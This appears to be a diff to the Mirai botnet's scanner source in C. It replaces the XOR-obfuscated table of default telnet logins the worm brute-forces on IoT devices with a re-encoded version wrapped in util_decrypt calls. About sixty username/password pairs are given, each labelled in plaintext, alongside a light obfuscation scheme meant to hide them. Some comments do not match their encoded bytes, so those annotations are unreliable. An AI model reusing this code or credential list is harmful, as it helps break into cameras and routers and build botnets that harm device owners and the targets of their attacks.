@@ -121,68 +121,68 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
-    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
-    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
-    add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);                      // root     888888
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x4F\x4A\x46\x4B\x52\x41", 5);                  // root     xmhdipc
-    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x47\x44\x43\x57\x4E\x56", 5);                  // root     default
-    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x57\x43\x4C\x56\x47\x41\x4A", 5);              // root     juantech
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14", 5);                      // root     123456
-    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
-    add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
-    add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
-    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
-    add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
-    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16", 3);      // admin    admin1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x13\x13\x13", 3);                              // root     1111
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x51\x4F\x41\x43\x46\x4F\x4B\x4C", 3);          // admin    smcadmin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13", 2);                          // admin    1111
-    add_auth_entry("\x50\x4D\x4D\x56", "\x14\x14\x14\x14\x14\x14", 2);                      // root     666666
-    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51\x55\x4D\x50\x46", 2);              // root     password
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16", 2);                              // root     1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11", 1);                      // root     klv123
-    add_auth_entry("\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x4F\x47\x4B\x4C\x51\x4F", 1); // Administrator admin
-    add_auth_entry("\x51\x47\x50\x54\x4B\x41\x47", "\x51\x47\x50\x54\x4B\x41\x47", 1);      // service  service
-    add_auth_entry("\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", "\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50", 1); // supervisor supervisor
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x45\x57\x47\x51\x56", 1);                      // guest    guest
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
-    add_auth_entry("\x45\x57\x47\x51\x56", "\x13\x10\x11\x16\x17", 1);                      // guest    12345
-    add_auth_entry("\x43\x46\x4F\x4B\x4C\x13", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);      // admin1   password
-    add_auth_entry("\x43\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50", "\x13\x10\x11\x16", 1); // administrator 1234
-    add_auth_entry("\x14\x14\x14\x14\x14\x14", "\x14\x14\x14\x14\x14\x14", 1);              // 666666   666666
-    add_auth_entry("\x1A\x1A\x1A\x1A\x1A\x1A", "\x1A\x1A\x1A\x1A\x1A\x1A", 1);              // 888888   888888
-    add_auth_entry("\x57\x40\x4C\x56", "\x57\x40\x4C\x56", 1);                              // ubnt     ubnt
-    add_auth_entry("\x50\x4D\x4D\x56", "\x49\x4E\x54\x13\x10\x11\x16", 1);                  // root     klv1234
-    add_auth_entry("\x50\x4D\x4D\x56", "\x78\x56\x47\x17\x10\x13", 1);                      // root     Zte521
-    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x11\x17\x13\x1A", 1);                      // root     hi3518
-    add_auth_entry("\x50\x4D\x4D\x56", "\x48\x54\x40\x58\x46", 1);                          // root     jvbzd
-    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x4C\x49\x4D", 4);                              // root     anko
-    add_auth_entry("\x50\x4D\x4D\x56", "\x58\x4E\x5A\x5A\x0C", 1);                          // root     zlxx.
-    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x54\x4B\x58\x5A\x54", 1); // root     7ujMko0vizxv
-    add_auth_entry("\x50\x4D\x4D\x56", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // root     7ujMko0admin
-    add_auth_entry("\x50\x4D\x4D\x56", "\x51\x5B\x51\x56\x47\x4F", 1);                      // root     system
-    add_auth_entry("\x50\x4D\x4D\x56", "\x4B\x49\x55\x40", 1);                              // root     ikwb
-    add_auth_entry("\x50\x4D\x4D\x56", "\x46\x50\x47\x43\x4F\x40\x4D\x5A", 1);              // root     dreambox
-    add_auth_entry("\x50\x4D\x4D\x56", "\x57\x51\x47\x50", 1);                              // root     user
-    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x47\x43\x4E\x56\x47\x49", 1);                  // root     realtek
-    add_auth_entry("\x50\x4D\x4D\x56", "\x12\x12\x12\x12\x12\x12\x12\x12", 1);              // root     00000000
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x13\x13\x13\x13\x13\x13", 1);              // admin    1111111
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16", 1);                          // admin    1234
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17", 1);                      // admin    12345
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x17\x16\x11\x10\x13", 1);                      // admin    54321
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14", 1);                  // admin    123456
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x15\x57\x48\x6F\x49\x4D\x12\x43\x46\x4F\x4B\x4C", 1); // admin    7ujMko0admin
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x16\x11\x10\x13", 1);                          // admin    1234
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
-    add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
-    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x50\x4B\x1B\x1D\x19\x19", 6), 10);                     // root     xc3511
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x5E\x41\x52\x50\x5E", 5), 9);                          // root     vizxv
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), 8);                          // root     admin
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), 7);                      // admin    admin
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x10\x10\x10\x10\x10\x10", 6), 6);                      // root     888888
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x50\x45\x40\x4C\x41\x58\x4B", 7), 5);                  // root     xmhdipc
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x4C\x4D\x4E\x49\x5D\x44\x5C", 7), 5);                  // root     default
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x42\x5D\x49\x46\x5C\x4D\x4B\x40", 8), 5);              // root     juantech
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D\x1E", 6), 5);                      // root     123456
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x1D\x1C\x1B\x1A\x19", 5), 5);                          // root     54321
+    add_auth_entry((char*)util_decrypt("\x5B\x5D\x58\x58\x47\x5A\x5C", 7), (char*)util_decrypt("\x5B\x5D\x58\x58\x47\x5A\x5C", 7), 5);      // support  support
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), "", 4);                                              // root     (none)
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x58\x49\x5B\x5B\x5F\x47\x5A\x4C", 8), 4);          // admin    password
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x5A\x47\x47\x5C", 4), 4);                              // root     root
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D", 5), 4);                          // root     12345
+    add_auth_entry((char*)util_decrypt("\x5D\x5B\x4D\x5A", 4), (char*)util_decrypt("\x5D\x5B\x4D\x5A", 4), 3);                              // user     user
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), "", 3);                                          // admin    (none)
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x58\x49\x5B\x5B", 4), 3);                              // root     pass
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x49\x4C\x45\x41\x46\x19\x1A\x1B\x1C", 9), 3);      // admin    admin1234
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x19\x19\x19\x19", 4), 3);                              // root     1111
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x5B\x45\x4B\x49\x4C\x45\x41\x46", 8), 3);          // admin    smcadmin
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x19\x19\x19\x19", 4), 2);                          // admin    1111
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x1E\x1E\x1E\x1E\x1E\x1E", 6), 2);                      // root     666666
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x58\x49\x5B\x5B\x5F\x47\x5A\x4C", 8), 2);              // root     password
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x19\x1A\x1B\x1C", 4), 2);                              // root     1234
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x43\x44\x5E\x19\x1A\x1B", 6), 1);                      // root     klv123
+    add_auth_entry((char*)util_decrypt("\x69\x4C\x45\x41\x46\x41\x5B\x5C\x5A\x49\x5C\x47\x5A", 13), (char*)util_decrypt("\x45\x4D\x41\x46\x5B\x45", 6), 1); // Administrator admin
+    add_auth_entry((char*)util_decrypt("\x5B\x4D\x5A\x5E\x41\x4B\x4D", 7), (char*)util_decrypt("\x5B\x4D\x5A\x5E\x41\x4B\x4D", 7), 1);      // service  service
+    add_auth_entry((char*)util_decrypt("\x5B\x5D\x58\x4D\x5A\x5E\x41\x5B\x47\x5A", 10), (char*)util_decrypt("\x5B\x5D\x58\x4D\x5A\x5E\x41\x5B\x47\x5A", 10), 1); // supervisor supervisor
+    add_auth_entry((char*)util_decrypt("\x4F\x5D\x4D\x5B\x5C", 5), (char*)util_decrypt("\x4F\x5D\x4D\x5B\x5C", 5), 1);                      // guest    guest
+    add_auth_entry((char*)util_decrypt("\x4F\x5D\x4D\x5B\x5C", 5), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D", 5), 1);                      // guest    12345
+    add_auth_entry((char*)util_decrypt("\x4F\x5D\x4D\x5B\x5C", 5), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D", 5), 1);                      // guest    12345
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46\x19", 6), (char*)util_decrypt("\x58\x49\x5B\x5B\x5F\x47\x5A\x4C", 8), 1);      // admin1   password
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46\x41\x5B\x5C\x5A\x49\x5C\x47\x5A", 13), (char*)util_decrypt("\x19\x1A\x1B\x1C", 4), 1); // administrator 1234
+    add_auth_entry((char*)util_decrypt("\x1E\x1E\x1E\x1E\x1E\x1E", 6), (char*)util_decrypt("\x1E\x1E\x1E\x1E\x1E\x1E", 6), 1);              // 666666   666666
+    add_auth_entry((char*)util_decrypt("\x10\x10\x10\x10\x10\x10", 6), (char*)util_decrypt("\x10\x10\x10\x10\x10\x10", 6), 1);              // 888888   888888
+    add_auth_entry((char*)util_decrypt("\x5D\x4A\x46\x5C", 4), (char*)util_decrypt("\x5D\x4A\x46\x5C", 4), 1);                              // ubnt     ubnt
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x43\x44\x5E\x19\x1A\x1B\x1C", 7), 1);                  // root     klv1234
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x72\x5C\x4D\x1D\x1A\x19", 6), 1);                      // root     Zte521
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x40\x41\x1B\x1D\x19\x10", 6), 1);                      // root     hi3518
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x42\x5E\x4A\x52\x4C", 5), 1);                          // root     jvbzd
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x49\x46\x43\x47", 4), 4);                              // root     anko
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x52\x44\x50\x50\x06", 5), 1);                          // root     zlxx.
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x1F\x5D\x42\x65\x43\x47\x18\x5E\x41\x52\x50\x5E", 12), 1); // root     7ujMko0vizxv
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x1F\x5D\x42\x65\x43\x47\x18\x49\x4C\x45\x41\x46", 12), 1); // root     7ujMko0admin
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x5B\x51\x5B\x5C\x4D\x45", 6), 1);                      // root     system
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x41\x43\x5F\x4A", 4), 1);                              // root     ikwb
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x4C\x5A\x4D\x49\x45\x4A\x47\x50", 8), 1);              // root     dreambox
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x5D\x5B\x4D\x5A", 4), 1);                              // root     user
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x5A\x4D\x49\x44\x5C\x4D\x43", 7), 1);                  // root     realtek
+    add_auth_entry((char*)util_decrypt("\x5A\x47\x47\x5C", 4), (char*)util_decrypt("\x18\x18\x18\x18\x18\x18\x18\x18", 8), 1);              // root     00000000
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x19\x19\x19\x19\x19\x19\x19", 7), 1);              // admin    1111111
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x19\x1A\x1B\x1C", 4), 1);                          // admin    1234
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D", 5), 1);                      // admin    12345
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x1D\x1C\x1B\x1A\x19", 5), 1);                      // admin    54321
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x19\x1A\x1B\x1C\x1D\x1E", 6), 1);                  // admin    123456
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x1F\x5D\x42\x65\x43\x47\x18\x49\x4C\x45\x41\x46", 12), 1); // admin    7ujMko0admin
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x1C\x1B\x1A\x19", 4), 1);                          // admin    1234
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x58\x49\x5B\x5B", 4), 1);                          // admin    pass
+    add_auth_entry((char*)util_decrypt("\x49\x4C\x45\x41\x46", 5), (char*)util_decrypt("\x45\x4D\x41\x46\x5B\x45", 6), 1);                  // admin    meinsm
+    add_auth_entry((char*)util_decrypt("\x5C\x4D\x4B\x40", 4), (char*)util_decrypt("\x5C\x4D\x4B\x40", 4), 1);                              // tech     tech
+    add_auth_entry((char*)util_decrypt("\x45\x47\x5C\x40\x4D\x5A", 6), (char*)util_decrypt("\x4E\x5D\x4B\x43\x4D\x5A", 6), 1);              // mother   fucker
 
 
 #ifdef DEBUG
